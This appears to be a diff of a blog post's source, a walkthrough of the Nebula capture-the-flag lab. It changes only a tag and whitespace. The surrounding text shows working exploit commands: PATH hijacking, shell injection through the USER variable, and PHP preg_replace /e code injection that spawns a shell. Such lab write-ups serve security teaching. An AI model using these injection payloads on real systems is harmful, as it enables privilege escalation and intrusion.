@@ -1,7 +1,7 @@
 ---
 title: Nebula
 date: 2017-03-15 15:43:28
-tags:
+tags: CTF
 ---
 
 This is a writeup of the Nebula CTF from [Exploit Exercises](https://exploit-exercises.com/). Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and one might still learn something new in different writeups. Also it is nice to have a reference of problems ones has solved at some point.
@@ -36,7 +36,7 @@ Now we can claim the flag:
 level00@nebula:~$ cd /rofs/bin/...
 level00@nebula:/rofs/bin/...$ ls
 flag00
-level00@nebula:/rofs/bin/...$ ./flag00 
+level00@nebula:/rofs/bin/...$ ./flag00
 Congrats, now run getflag to get your flag!
 flag00@nebula:/rofs/bin/...$ getflag
 You have successfully executed getflag on a target account
@@ -71,8 +71,8 @@ It is useful to know that the man pages contain the documentation of the functio
 
 ```bash
 level01@nebula:/home/flag01$ echo "/bin/bash" > /tmp/echo
-level01@nebula:/home/flag01$ chmod a+x /tmp/echo 
-level01@nebula:/home/flag01$ PATH=/tmp:$PATH ./flag01 
+level01@nebula:/home/flag01$ chmod a+x /tmp/echo
+level01@nebula:/home/flag01$ PATH=/tmp:$PATH ./flag01
 flag01@nebula:/home/flag01$ getflag
 You have successfully executed getflag on a target account
 ```
@@ -106,7 +106,7 @@ int main(int argc, char **argv, char **envp)
 
   asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
   printf("about to call system(\"%s\")\n", buffer);
-  
+
   system(buffer);
 }
 ```
@@ -114,10 +114,10 @@ int main(int argc, char **argv, char **envp)
 The permission preamble is the same as in the last flag but now we have the possibility to change a buffer that is executed via the `$USER` environment variable. The is also a `printf` that shows us what we are doing.
 
 ```
-level02@nebula:/home/flag02$ ./flag02 
+level02@nebula:/home/flag02$ ./flag02
 about to call system("/bin/echo level02 is cool")
 level02 is cool
-level02@nebula:/home/flag02$ USER="test && /bin/bash &&" ./flag02 
+level02@nebula:/home/flag02$ USER="test && /bin/bash &&" ./flag02
 about to call system("/bin/echo test && /bin/bash && is cool")
 test
 flag02@nebula:/home/flag02$ getflag
@@ -142,7 +142,7 @@ So let's have a look at the directory:
 ```bash
 level03@nebula:/home/flag03$ ls
 writable.d  writable.sh
-level03@nebula:/home/flag03$ cat writable.sh 
+level03@nebula:/home/flag03$ cat writable.sh
 #!/bin/sh
 
 for i in /home/flag03/writable.d/* ; do
@@ -151,7 +151,7 @@ for i in /home/flag03/writable.d/* ; do
 done
 
 level03@nebula:/home/flag03$ ls writable.d
-level03@nebula:/home/flag03$ 
+level03@nebula:/home/flag03$
 ```
 
 So we have a crontab that executes `writable.sh` every couple of minutes, which executes everything in `writable.d` (with a 5s timeout) and removes it afterwards.
@@ -459,7 +459,7 @@ The login name `l.le.ev.ve.el.l8.8` suggest that the keypresses are all transmit
 
 ```bash
 level08@nebula:~$ su flag08
-Password: 
+Password:
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
 ```
@@ -475,7 +475,7 @@ function spam($email)
 {
   $email = preg_replace("/\./", " dot ", $email);
   $email = preg_replace("/@/", " AT ", $email);
-  
+
   return $email;
 }
 
@@ -503,7 +503,7 @@ Before we check, let's first analyze what the code does: It prints the output of
 
 ```bash
 level09@nebula:/home/flag09$ echo [email mail@example.com] > /tmp/exploit
-level09@nebula:/home/flag09$ ./flag09 /tmp/exploit 
+level09@nebula:/home/flag09$ ./flag09 /tmp/exploit
 PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
 mail AT example dot com
 ```
@@ -511,8 +511,8 @@ mail AT example dot com
 A look at the documentation reveals that there is indeed a vulnerability in `preg_replace` with the `/e` flag which has been deprecated in later PHP versions. The second match group, which is the email address itself, is passed to spam, or is rather injected into spam call in a string, which is the evaluated. From a modern programming standpoint this already sound ridiculous. It's not that hard to find information about how to exploit it: If we wrap the desired command like `{${command}}` (for more information search for 'php complex curly syntax') it is inserted into the second string such that the command is executed before it's output is passed to `spam`:
 
 ```bash
-level09@nebula:/home/flag09$ echo '[email {${system(sh)}}]' > /tmp/exploit 
-level09@nebula:/home/flag09$ ./flag09 /tmp/exploit 
+level09@nebula:/home/flag09$ echo '[email {${system(sh)}}]' > /tmp/exploit
+level09@nebula:/home/flag09$ ./flag09 /tmp/exploit
 PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
 PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/flag09/flag09.php(15) : regexp code on line 1
 sh-4.2$ whoami
@@ -631,7 +631,7 @@ dummy
 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
 [...]
 level10@nebula:/home/flag10$ su flag10
-Password: 
+Password:
 sh-4.2$ getflag
 You have successfully executed getflag on a target account
 ```
